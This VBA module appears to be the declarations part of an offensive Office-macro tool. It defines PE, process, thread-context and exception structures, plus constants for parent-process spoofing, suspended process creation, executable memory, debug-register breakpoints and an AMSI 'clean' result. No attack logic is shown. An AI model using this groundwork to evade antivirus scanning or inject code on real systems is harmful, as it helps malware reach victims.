Option Explicit

' ==================== PE structures ====================

Public Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Public Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
End Type

Public Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Public Type IMAGE_OPTIONAL_HEADER64
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUninitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    ImageBase As LongLong
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    Win32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    Subsystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As LongLong
    SizeOfStackCommit As LongLong
    SizeOfHeapReserve As LongLong
    SizeOfHeapCommit As LongLong
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Public Type IMAGE_NT_HEADERS64
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER64
End Type

Public Type IMAGE_SECTION_HEADER
    Name(0 To 7) As Byte
    Misc_VirtualSize As Long
    VirtualAddress As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    Characteristics As Long
End Type

Public Type IMAGE_EXPORT_DIRECTORY
    Characteristics As Long
    TimeDateStamp As Long
    MajorVersion As Integer
    MinorVersion As Integer
    Name As Long
    Base As Long
    NumberOfFunctions As Long
    NumberOfNames As Long
    AddressOfFunctions As Long
    AddressOfNames As Long
    AddressOfNameOrdinals As Long
End Type

' ==================== NT object structures ====================

Public Type UNICODE_STRING
    Length As Integer
    MaximumLength As Integer
    Padding As Long           ' implicit padding to 8-byte align Buffer
    Buffer As LongPtr
End Type

Public Type OBJECT_ATTRIBUTES
    Length As Long
    Pad1 As Long              ' explicit pad so RootDirectory is 8-aligned
    RootDirectory As LongPtr
    ObjectName As LongPtr     ' pointer to UNICODE_STRING
    Attributes As Long
    Pad2 As Long
    SecurityDescriptor As LongPtr
    SecurityQualityOfService As LongPtr
End Type

Public Type IO_STATUS_BLOCK
    StatusOrPointer As LongPtr  ' union of NTSTATUS / PVOID
    Information As LongPtr
End Type

' ==================== Win32 process structures ====================

Public Type STARTUPINFO
    cb As Long
    Pad1 As Long              ' align lpReserved to 8 bytes
    lpReserved As LongPtr
    lpDesktop As LongPtr
    lpTitle As LongPtr
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    Pad2 As Long              ' align lpReserved2 to 8 bytes
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Public Type STARTUPINFOEX
    StartupInfo As STARTUPINFO
    lpAttributeList As LongPtr
End Type

Public Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

' PROCESSENTRY32W (Toolhelp32 wide variant)
Public Type PROCESSENTRY32W
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    Pad1 As Long
    th32DefaultHeapID As LongPtr
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile(0 To 519) As Byte   ' WCHAR[MAX_PATH] = 260 wchars = 520 bytes
End Type

' ==================== CONTEXT64 (full size, 1232 bytes) ====================

Public Type CONTEXT64
    P1Home As LongLong
    P2Home As LongLong
    P3Home As LongLong
    P4Home As LongLong
    P5Home As LongLong
    P6Home As LongLong
    ContextFlags As Long
    MxCsr As Long
    SegCs As Integer
    SegDs As Integer
    SegEs As Integer
    SegFs As Integer
    SegGs As Integer
    SegSs As Integer
    EFlags As Long
    Dr0 As LongLong
    Dr1 As LongLong
    Dr2 As LongLong
    Dr3 As LongLong
    Dr6 As LongLong
    Dr7 As LongLong
    Rax As LongLong
    Rcx As LongLong
    Rdx As LongLong
    Rbx As LongLong
    Rsp As LongLong
    Rbp As LongLong
    Rsi As LongLong
    Rdi As LongLong
    R8 As LongLong
    R9 As LongLong
    R10 As LongLong
    R11 As LongLong
    R12 As LongLong
    R13 As LongLong
    R14 As LongLong
    R15 As LongLong
    Rip As LongLong
    FltSave(0 To 511) As Byte           ' XMM_SAVE_AREA32, 512 bytes
    VectorRegister(0 To 415) As Byte    ' M128A[26] = 416 bytes
    VectorControl As LongLong
    DebugControl As LongLong
    LastBranchToRip As LongLong
    LastBranchFromRip As LongLong
    LastExceptionToRip As LongLong
    LastExceptionFromRip As LongLong
End Type

' ==================== Exception handling ====================

Public Type EXCEPTION_RECORD
    ExceptionCode As Long
    ExceptionFlags As Long
    ExceptionRecord As LongPtr
    ExceptionAddress As LongPtr
    NumberParameters As Long
    Pad1 As Long
    ExceptionInformation(0 To 14) As LongPtr
End Type

Public Type EXCEPTION_POINTERS
    pExceptionRecord As LongPtr
    pContextRecord As LongPtr
End Type

' ==================== Constants ====================

Public Const MEM_COMMIT As Long = &H1000
Public Const MEM_RESERVE As Long = &H2000
Public Const MEM_RELEASE As Long = &H8000
Public Const PAGE_NOACCESS As Long = &H1
Public Const PAGE_READONLY As Long = &H2
Public Const PAGE_READWRITE As Long = &H4
Public Const PAGE_EXECUTE_READ As Long = &H20
Public Const PAGE_EXECUTE_READWRITE As Long = &H40

Public Const CREATE_SUSPENDED As Long = &H4
Public Const EXTENDED_STARTUPINFO_PRESENT As Long = &H80000
Public Const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS As LongPtr = &H20000

Public Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Public Const THREAD_ALL_ACCESS As Long = &H1F03FF

Public Const TH32CS_SNAPPROCESS As Long = &H2

Public Const CONTEXT_AMD64 As Long = &H100000
Public Const CONTEXT_DEBUG_REGISTERS As Long = &H100010   ' CONTEXT_AMD64 | 0x10

Public Const EXCEPTION_SINGLE_STEP As Long = &H80000004
Public Const EXCEPTION_CONTINUE_EXECUTION As Long = -1
Public Const EXCEPTION_CONTINUE_SEARCH As Long = 0

Public Const STATUS_SUCCESS As Long = 0
Public Const SECTION_MAP_READ As Long = &H4

Public Const AMSI_RESULT_CLEAN As Long = 0
